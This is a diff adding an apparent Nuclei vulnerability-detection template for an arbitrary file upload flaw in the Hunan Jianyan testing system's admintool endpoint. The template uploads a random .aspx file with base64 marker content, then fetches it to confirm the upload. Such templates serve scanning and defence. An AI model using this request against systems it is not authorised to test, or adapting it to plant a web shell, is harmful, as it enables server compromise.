@@ -1,0 +1,45 @@
+id: hunanjianyan-admin-file-upload
+info:
+  name: 湖南建研检测系统 admintool 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    湖南建研检测系统 admintool 任意文件上传漏洞 allows attackers to upload arbitrary files.
+
+variables:
+  t1: "{{rand_base(6)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Scripts/admintool?type=updatefile"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "filePath={{t1}}.aspx&fileContent={{t2}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "创建文件成功"
+
+  - id: check-file
+    method: GET
+    path:
+      - "{{BaseURL}}/Scripts/{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
